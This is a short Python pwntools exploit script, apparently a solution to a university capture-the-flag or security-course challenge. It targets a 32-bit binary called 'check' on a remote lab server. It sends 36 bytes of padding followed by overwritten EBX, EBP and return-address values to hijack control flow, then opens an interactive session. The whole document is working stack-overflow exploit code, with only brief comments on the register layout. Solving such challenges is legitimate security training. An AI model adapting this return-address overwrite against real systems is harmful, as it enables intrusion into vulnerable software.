# EBP 0xffffcec8 41 42 43 44
#EBX 0xffffcec4 -> 0x0804a000 37 38 39 40
# 45 46 47 48 EIP
from pwn import *
import sys

host ='mustard.stt.rnl.tecnico.ulisboa.pt'
port = '22155'

ebx = 0x0804a001
ebp = 0xaaaaaaaa
eip = 0x080487d9

elf = ELF('./check')

s = b'A' * 36 + p32(ebx) + p32(ebp) + p32(eip) 


p = remote(host, port)
#p = process('./check')

#raw_input()

p.sendline(s)
p.interactive()


